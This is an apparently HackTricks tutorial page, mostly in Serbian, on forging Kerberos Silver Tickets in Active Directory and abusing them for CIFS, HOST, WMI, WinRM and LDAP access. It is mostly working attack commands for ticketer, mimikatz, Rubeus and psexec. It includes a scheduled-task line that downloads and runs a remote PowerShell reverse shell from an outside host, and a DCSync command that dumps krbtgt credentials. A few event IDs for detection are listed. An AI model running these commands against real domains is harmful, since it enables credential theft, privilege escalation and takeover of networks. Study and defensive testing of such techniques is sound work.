# Silver Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Silver ticket

Napad **Silver Ticket** uključuje eksploataciju servisnih karata u Active Directory (AD) okruženjima. Ova metoda se oslanja na **sticanje NTLM heša servisnog naloga**, kao što je nalog računara, kako bi se falsifikovala Ticket Granting Service (TGS) karta. Sa ovom falsifikovanom kartom, napadač može pristupiti specifičnim uslugama na mreži, **pretvarajući se da je bilo koji korisnik**, obično sa ciljem sticanja administratorskih privilegija. Naglašava se da je korišćenje AES ključeva za falsifikovanje karata sigurnije i manje uočljivo.

Za kreiranje karata koriste se različiti alati u zavisnosti od operativnog sistema:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### На Виндовсу
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servis je istaknut kao uobičajeni cilj za pristupanje fajl sistemu žrtve, ali se i drugi servisi kao što su HOST i RPCSS takođe mogu iskoristiti za zadatke i WMI upite.

## Dostupne Usluge

| Tip Usluge                                 | Usluge Silver Tickets                                                      |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                   |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>U zavisnosti od OS takođe:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>U nekim slučajevima možete samo tražiti: WINRM</p> |
| Zakazani Zadaci                            | HOST                                                                      |
| Windows Deljenje Fajlova, takođe psexec   | CIFS                                                                      |
| LDAP operacije, uključujući DCSync        | LDAP                                                                      |
| Windows Alati za Udaljenu Administraciju   | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                        |
| Zlatni Tiketi                             | krbtgt                                                                    |

Koristeći **Rubeus** možete **tražiti sve** ove tikete koristeći parametar:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Event ID-ovi za Silver tikete

* 4624: Prijava na nalog
* 4634: Odjava sa naloga
* 4672: Prijava administratora

## Zloupotreba Uslužnih tiketa

U sledećim primerima zamislimo da je tiket preuzet imitujući administratorski nalog.

### CIFS

Sa ovim tiketom bićete u mogućnosti da pristupite `C$` i `ADMIN$` folderu putem **SMB** (ako su izloženi) i kopirate fajlove u deo udaljenog fajl sistema jednostavno radeći nešto poput:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Moći ćete da dobijete shell unutar hosta ili izvršite proizvoljne komande koristeći **psexec**:

{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
{% endcontent-ref %}

### HOST

Sa ovom dozvolom možete generisati zakazane zadatke na udaljenim računarima i izvršiti proizvoljne komande:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Sa ovim tiketima možete **izvršiti WMI u sistemu žrtve**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Nađite **više informacija o wmiexec** na sledećoj stranici:

{% content-ref url="../lateral-movement/wmiexec.md" %}
[wmiexec.md](../lateral-movement/wmiexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Sa winrm pristupom preko računara možete **pristupiti** i čak dobiti PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Proverite sledeću stranicu da biste saznali **više načina za povezivanje sa udaljenim hostom koristeći winrm**:

{% content-ref url="../lateral-movement/winrm.md" %}
[winrm.md](../lateral-movement/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Imajte na umu da **winrm mora biti aktivan i slušati** na udaljenom računaru da biste mu pristupili.
{% endhint %}

### LDAP

Sa ovom privilegijom možete dumpovati DC bazu koristeći **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saznajte više o DCSync** na sledećoj stranici:

## Reference

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty savet**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
